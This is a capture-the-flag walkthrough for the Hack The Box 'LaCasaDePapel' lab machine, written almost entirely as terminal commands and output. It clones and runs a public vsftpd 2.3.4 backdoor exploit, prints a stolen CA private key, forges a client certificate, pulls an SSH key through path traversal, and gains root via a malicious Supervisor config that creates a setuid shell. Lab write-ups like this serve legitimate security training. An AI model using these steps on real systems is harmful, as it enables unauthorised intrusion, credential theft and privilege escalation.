# Target
| Category          | Details                                                            |
|-------------------|--------------------------------------------------------------------|
| 📝 **Name**       | [LaCasaDePapel](https://app.hackthebox.com/machines/LaCasaDePapel) |  
| 🏷 **Type**       | HTB Machine                                                        |
| 🖥️ **OS**        | Linux                                                              |
| 🎯 **Difficulty** | Easy                                                               |

# Attack path
1. [Exfiltrate private key of certificate authority through backdoor in `vsftpd 2.3.4`](#exfiltrate-private-key-of-certificate-authority-through-backdoor-in-vsftpd-234-cve-2011-2523)
2. [Obtain certificate details (Common Name and Organization)](#obtain-certificate-details-common-name-and-organization)
3. [Create a self-signed CA certificate](#create-a-self-signed-ca-certificate)
4. [Generate private key and sign it with exfiltrated certificate](#generate-private-key-and-sign-it-with-exfiltrated-certificate)
5. [Access web application running at 443 with signed private key](#access-web-application-running-at-443-with-signed-private-key)
6. [Exfiltrate private SSH key through LFI](#exfiltrate-private-ssh-key-through-lfi)
7. [Gain access over SSH with exfiltrated key](#gain-access-over-ssh-with-exfiltrated-key)
8. [Escalate to root through Supervisor misconfiguration](#escalate-to-root-through-supervisor-misconfiguration)

#### Exfiltrate private key of certificate authority through backdoor in `vsftpd 2.3.4` ([CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523))
```
┌──(magicrc㉿perun)-[~/attack/HTB LaCasaDePapel]
└─$ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit && \
python3 -m venv htb && \
source htb/bin/activate && \
pip3 install pwn && \
python3 ./vsftpd_2.3.4_Exploit/exploit.py $TARGET
...
<SNIP>
...
[+] Got Shell!!!
[+] Opening connection to 10.129.183.78 on port 21: Done
[*] Closed connection to 10.129.183.78 port 21
[+] Opening connection to 10.129.183.78 on port 6200: Done
[*] Switching to interactive mode
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
$ file_get_contents('/home/nairobi/ca.key')
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """
```

#### Obtain certificate details (Common Name and Organization)
```
┌──(magicrc㉿perun)-[~/attack/HTB LaCasaDePapel]
└─$ curl -svI https://$TARGET -k 2>&1 | grep subject
*   subject: CN=lacasadepapel.htb,O=La Casa De Papel
```

#### Create a self-signed CA certificate
```
┌──(magicrc㉿perun)-[~/attack/HTB LaCasaDePapel]
└─$ sed -e 's/^[ \t]*//' -e 's/\\n//g' <<EOF> ca.key && \
openssl req -new -x509 -key ca.key -out ca.crt -subj "/CN=lacasadepapel.htb/O=La Casa De Papel"
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
EOF
```

#### Generate private key and sign it with exfiltrated certificate
```
┌──(magicrc㉿perun)-[~/attack/HTB LaCasaDePapel]
└─$ openssl genrsa -out client.key 2048 && \
openssl req -new -key client.key -out client.csr -subj "/CN=client.lacasadepapel.htb/O=La Casa De Papel" && \
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365 -sha256
```

#### Access web application running at 443 with signed private key
```
┌──(magicrc㉿perun)-[~/attack/HTB LaCasaDePapel]
└─$ curl -s --cert client.crt --key client.key https://$TARGET?path=../.ssh -k | grep id_rsa
},3000);</script></head><body><div><h1>PRIVATE AREA</h1><img id="img_wait" src="waiting.gif"><h2 id="h2_wait">CONECTION TO SERVER<br>PLEASE WAIT</h2><ul id="ui_list" style="display:none"><li><strong>authorized_keys</strong></li><li><strong>id_rsa</strong></li><li><strong>id_rsa.pub</strong></li><li><strong>known_hosts</strong></li></ul></div></body></html>
```

#### Exfiltrate private SSH key through LFI
```
┌──(magicrc㉿perun)-[~/attack/HTB LaCasaDePapel]
└─$ SSH_KEY_PATH=$(echo -n "../.ssh/id_rsa" | base64)
curl -sk --cert client.crt --key client.key https://$TARGET/file/$SSH_KEY_PATH -o id_rsa && \
chmod 600 id_rsa
```

#### Gain access over SSH with exfiltrated key
```
┌──(magicrc㉿perun)-[~/attack/HTB LaCasaDePapel]
└─$ ssh professor@$TARGET -i id_rsa

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ id
uid=1002(professor) gid=1002(professor) groups=1002(professor)
```

#### Escalate to root through Supervisor misconfiguration
```
lacasadepapel [~]$ (cat <<EOF> /home/professor/memcached.ini 
[program:memcached]
command = /bin/bash -c "/bin/cp /bin/bash /tmp/root_shell; /bin/chmod +s /tmp/root_shell"
EOF
) && while [ ! -f /tmp/root_shell ]; do sleep 1; done && /tmp/root_shell -p
lacasadepapel [~]$ id
uid=1002(professor) gid=1002(professor) euid=0(root) egid=0(root) groups=0(root),1002(professor)
```
